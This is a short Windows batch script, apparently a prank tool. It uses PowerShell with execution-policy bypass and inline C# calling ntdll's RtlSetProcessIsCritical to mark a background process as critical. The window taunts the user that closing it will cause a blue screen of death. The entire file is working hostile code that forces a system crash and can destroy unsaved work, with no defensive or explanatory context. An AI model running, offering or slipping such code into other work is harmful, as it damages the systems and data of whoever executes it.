@echo off
setlocal enabledelayedexpansion
title %~f0
for /f "tokens=1,2 delims=#" %%x in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (set ESC=%%y)
if /i not "%~1" == "" (for /f "delims=-" %%p in ('echo %~1') do (call :%%p %2 %3 %4 %5 %6 %7 %8 %9))
goto WinMain

:SetProcessAsCritical
   powershell -ep Bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport(\"ntdll.dll\", SetLastError = true)] public static extern int RtlSetProcessIsCritical(bool bNewValue, out bool pbOldValue, bool bCheckFlag); }'; $null = [NativeMethods]::RtlSetProcessIsCritical($true, [ref]$false, $false); Wait-Event;" >nul 2>nul
goto :eof

:WinMain
   start /b "" cmd /c "%~f0" -SetProcessAsCritical
   set color_decimal=1
   :Loop
      echo %ESC%[2f%ESC%[38;5;!color_decimal!m If you close this window, a blue screen of death will appear :D
      if !color_decimal! geq 255 (set color_decimal=0)
      set /a color_decimal+=1
      powershell -c "Start-Sleep -Milliseconds 10" >nul 2>nul
    goto Loop
goto :eof